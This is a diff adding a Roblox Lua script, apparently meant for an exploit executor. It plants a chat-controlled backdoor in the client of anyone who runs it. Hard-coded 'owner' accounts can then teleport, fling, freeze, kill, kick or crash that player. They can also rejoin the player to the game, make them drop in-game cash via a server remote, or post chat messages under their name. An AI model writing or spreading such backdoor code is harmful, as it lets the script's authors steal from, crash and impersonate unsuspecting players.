@@ -1,0 +1,103 @@
+local Players = game:GetService('Players')
+local TextChatService = game:GetService('TextChatService')
+local ReplicatedStorage = game:GetService('ReplicatedStorage')
+local TeleportService = game:GetService('TeleportService')
+
+local ownerIDs = {8336437998, 42636633, 7272929129}
+
+local function isOwner(userId)
+    return getgenv().ownerIDs and getgenv().ownerIDs[userId] ~= nil
+end
+
+local function isInOwnerList(userId)
+    for _, id in ipairs(ownerIDs) do
+        if userId == id then
+            return true
+        end
+    end
+    return false
+end
+
+local LocalPlayer = Players.LocalPlayer
+
+if LocalPlayer and (isOwner(LocalPlayer.UserId) or isInOwnerList(LocalPlayer.UserId)) then
+    print('true')
+else
+    local function handleCommand(sender, message)
+        local command, args = message:match('^:(%S+)%s*(.*)')
+        
+        if not command then
+            return
+        end
+        
+        local function matchesName(name)
+            return name == '.' or LocalPlayer.Name:lower():find(name:lower()) or LocalPlayer.DisplayName:lower():find(name:lower())
+        end
+        
+        if isOwner(sender.UserId) then
+            if args and matchesName(args) then
+                if command == 'bring' then
+                    if sender.Character and sender.Character:FindFirstChild('HumanoidRootPart') and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') then
+                        LocalPlayer.Character.HumanoidRootPart.CFrame = sender.Character.HumanoidRootPart.CFrame
+                    end
+                elseif command == 'fling' then
+                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') then
+                        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(math.huge, math.huge, math.huge)
+                    end
+                elseif command == 'kick' then
+                    LocalPlayer:Kick('You have been kicked by an owner.')
+                elseif command == 'ban' then
+                    LocalPlayer:Kick('PERMA-BAN by owner.')
+                elseif command == 'freeze' then
+                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('LowerTorso') then
+                        LocalPlayer.Character.LowerTorso.Anchored = true
+                    end
+                elseif command == 'unfreeze' then
+                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('LowerTorso') then
+                        LocalPlayer.Character.LowerTorso.Anchored = false
+                    end
+                elseif command == 'reset' then
+                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('Humanoid') then
+                        LocalPlayer.Character.Humanoid.Health = 0
+                    end
+                elseif command == 'dropcash' then
+                    local mainEvent = ReplicatedStorage:FindFirstChild('MainEvent')
+                    if mainEvent then
+                        mainEvent:FireServer('DropMoney', '12000')
+                    end
+                elseif command == 'rejoin' then
+                    TeleportService:Teleport(game.PlaceId, LocalPlayer)
+                elseif command == 'crash' then
+                    while true do end
+                end
+            end
+            
+            if command == 'say' and args and args:find(' ') then
+                local spacePos = args:find(' ')
+                local targetName = args:sub(1, spacePos - 1)
+                local messageText = args:sub(spacePos + 1)
+                
+                if matchesName(targetName) and messageText ~= '' then
+                    local textChannels = TextChatService:FindFirstChild('TextChannels')
+                    if textChannels then
+                        textChannels = textChannels:FindFirstChild('RBXGeneral')
+                    end
+                    if textChannels then
+                        pcall(function()
+                            textChannels:SendAsync(messageText)
+                        end)
+                    end
+                end
+            end
+        end
+    end
+    
+    TextChatService.MessageReceived:Connect(function(message)
+        if message and message.Text and message.TextSource then
+            local sender = Players:GetPlayerByUserId(message.TextSource.UserId)
+            if sender then
+                handleCommand(sender, message.Text)
+            end
+        end
+    end)
+end
